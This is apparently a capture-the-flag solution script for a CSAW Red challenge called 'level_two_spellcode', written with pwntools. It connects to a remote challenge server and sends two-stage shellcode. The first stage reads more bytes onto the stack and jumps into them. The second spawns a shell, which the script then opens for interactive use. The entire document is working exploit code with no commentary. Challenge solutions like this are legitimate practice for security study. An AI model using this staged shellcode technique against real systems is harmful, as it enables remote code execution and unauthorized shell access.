from pwn import *
#p = process("./level_two_spellcode")
p = remote("pwn.red.csaw.io", 5009)
p.recvuntil("tion")
p.sendline("3")
p.recvuntil("> ")
payload = (
	asm("jmp .+17").ljust(17, b"\x00") +
	asm("""
mov eax,3
xor ebx,ebx
lea ecx,[esp]
mov edx,100
int 0x80
lea eax, [esp]
call eax
""")
)
payload2 = asm(shellcraft.sh())
print(len(payload))
p.sendline(payload)
p.sendline(payload2)
p.interactive()
